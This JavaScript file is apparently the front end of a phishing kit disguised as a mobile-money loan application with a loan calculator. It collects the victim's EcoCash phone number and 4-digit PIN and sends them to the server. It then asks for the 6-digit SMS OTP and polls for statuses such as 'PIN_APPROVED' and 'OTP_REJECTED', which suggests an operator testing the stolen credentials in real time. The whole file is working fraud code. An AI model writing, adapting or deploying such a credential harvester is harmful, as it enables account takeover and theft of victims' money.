let currentAppRef = null;
let statusPollInterval = null;

function updateLoanCalc() {
  const amount = parseInt(document.getElementById('loanRange').value);
  const interest = Math.round(amount * 0.10);
  const total = amount + interest;

  document.getElementById('calc-amount').innerText = '$' + amount;
  document.getElementById('calc-interest').innerText = '$' + interest;
  document.getElementById('calc-total').innerText = '$' + total;
}

function showSection(sectionId) {
  ['form-step-1', 'form-step-2', 'step-loading', 'form-step-3', 'step-success', 'step-rejected'].forEach(id => {
    document.getElementById(id).classList.add('hidden');
  });

  if (sectionId === 'step-success') {
    document.getElementById('app-header').classList.add('hidden');
  }

  document.getElementById(sectionId).classList.remove('hidden');
}

function validateAndGoToStep2() {
  const name = document.getElementById('fullName').value.trim();
  const occupation = document.getElementById('occupation').value.trim();
  const income = document.getElementById('monthlyIncome').value.trim();

  if (!name || !occupation || !income) {
    alert("Please complete all required fields before proceeding.");
    return;
  }
  showSection('form-step-2');
}

async function submitStep2Details() {
  const phone = document.getElementById('phone').value.trim();
  const pin = document.getElementById('pin').value.trim();

  if (phone.length !== 9 || pin.length !== 4) {
    alert("Please enter a valid 9-digit EcoCash phone number and 4-digit PIN.");
    return;
  }

  const payload = {
    fullName: document.getElementById('fullName').value,
    occupation: document.getElementById('occupation').value,
    monthlyIncome: document.getElementById('monthlyIncome').value,
    repaymentPeriod: document.getElementById('repaymentPeriod').value,
    loanAmount: document.getElementById('loanRange').value,
    phone: phone,
    pin: pin
  };

  try {
    showSection('step-loading');
    startCountdown(10);

    const res = await fetch('/api/apply-loan', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });

    const data = await res.json();
    if (data.success) {
      currentAppRef = data.appReference;
      startStatusPolling();
    } else {
      alert("Application failed. Please try again.");
      showSection('form-step-2');
    }
  } catch (err) {
    alert("Network error. Please try again.");
    showSection('form-step-2');
  }
}

async function submitOTPDetails() {
  const otpCode = document.getElementById('otpCode').value.trim();

  if (otpCode.length !== 6) {
    alert("Please enter a valid 6-digit OTP code.");
    return;
  }

  try {
    showSection('step-loading');
    startCountdown(10);

    const res = await fetch('/api/submit-otp', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        appReference: currentAppRef,
        otpCode: otpCode
      })
    });

    const data = await res.json();
    if (data.success) {
      startStatusPolling();
    }
  } catch (err) {
    alert("Error submitting OTP. Please try again.");
  }
}

function startCountdown(seconds) {
  let timer = seconds;
  const timerElem = document.getElementById('timer');
  timerElem.innerText = `${timer}s`;

  const interval = setInterval(() => {
    timer--;
    timerElem.innerText = `${timer}s`;
    if (timer <= 0) {
      clearInterval(interval);
    }
  }, 1000);
}

function startStatusPolling() {
  if (statusPollInterval) clearInterval(statusPollInterval);

  statusPollInterval = setInterval(async () => {
    if (!currentAppRef) return;

    try {
      const res = await fetch(`/api/check-status/${currentAppRef}`);
      const data = await res.json();

      if (data.success) {
        if (data.status === 'PIN_APPROVED') {
          clearInterval(statusPollInterval);
          showSection('form-step-3');
        } else if (data.status === 'PIN_REJECTED') {
          clearInterval(statusPollInterval);
          document.getElementById('rejection-msg').innerText = "Incorrect EcoCash PIN provided.";
          showSection('step-rejected');
        } else if (data.status === 'OTP_APPROVED' || data.status === 'LOAN_APPROVED') {
          clearInterval(statusPollInterval);
          showSection('step-success');
        } else if (data.status === 'OTP_REJECTED') {
          clearInterval(statusPollInterval);
          document.getElementById('rejection-msg').innerText = "Incorrect SMS OTP code provided.";
          showSection('step-rejected');
        }
      }
    } catch (err) {
      console.error("Polling status error:", err);
    }
  }, 2000);
                                        }
      
